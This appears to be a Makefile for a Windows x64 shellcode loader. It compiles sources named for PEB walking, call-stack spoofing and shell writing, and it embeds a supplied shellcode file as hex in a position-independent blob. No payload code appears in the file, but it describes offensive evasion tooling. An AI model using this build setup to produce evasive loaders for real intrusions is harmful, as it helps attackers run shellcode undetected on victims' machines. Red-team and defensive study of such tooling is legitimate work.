# ── Toolchain ─────────────────────────────────────────────────────────
CC_64    = x86_64-w64-mingw32-gcc
CFLAGS   = -O0 -fno-jump-tables -mno-stack-arg-probe -fno-omit-frame-pointer \
           -shared -Wall -Wno-pointer-arith -masm=intel
NASM_64  = nasm -f win64
NASM_BIN = nasm -f bin

# ── Shellcode input ───────────────────────────────────────────────────
SC_HEX_DATA := $(shell xxd -p $(SCFILE) | tr -d '\n')

# ── Crystal Palace linker ─────────────────────────────────────────────
CPL_64_BASE = cpl link loader.spec bin/loader.x64.o bin/out.x64.bin


# ── Phony targets ─────────────────────────────────────────────────────
.PHONY: all x64 link.x64 clean

# ── Default target ────────────────────────────────────────────────────
all: src/peb_walk_blob.h x64 link.x64

# ── Create bin/ directory ─────────────────────────────────────────────
bin:
	mkdir -p bin

# ── Generate PEB walk blob header from NASM source ───────────────────
src/peb_walk_blob.h: src/peb_walk.asm | bin
	$(NASM_BIN) src/peb_walk.asm -o bin/peb_walk.bin
	python3 utils/bin2h_peb.py bin/peb_walk.bin _peb_walk_blob > src/peb_walk_blob.h

# ── Compile x64 objects ───────────────────────────────────────────────
x64: bin src/peb_walk_blob.h
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c      -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/services.c    -o bin/services.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/shellwriter.c -o bin/shellwriter.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/spoof.c       -o bin/spoof.x64.o
	$(NASM_BIN) src/spoof_call.asm -o bin/spoof_call.bin

# ── Link Crystal Palace PIC blob ─────────────────────────────────────
link.x64: x64
	$(CPL_64_BASE) SC=$(SC_HEX_DATA)

# ── Clean ─────────────────────────────────────────────────────────────
clean:
	rm -rf bin/
	rm -f src/peb_walk_blob.h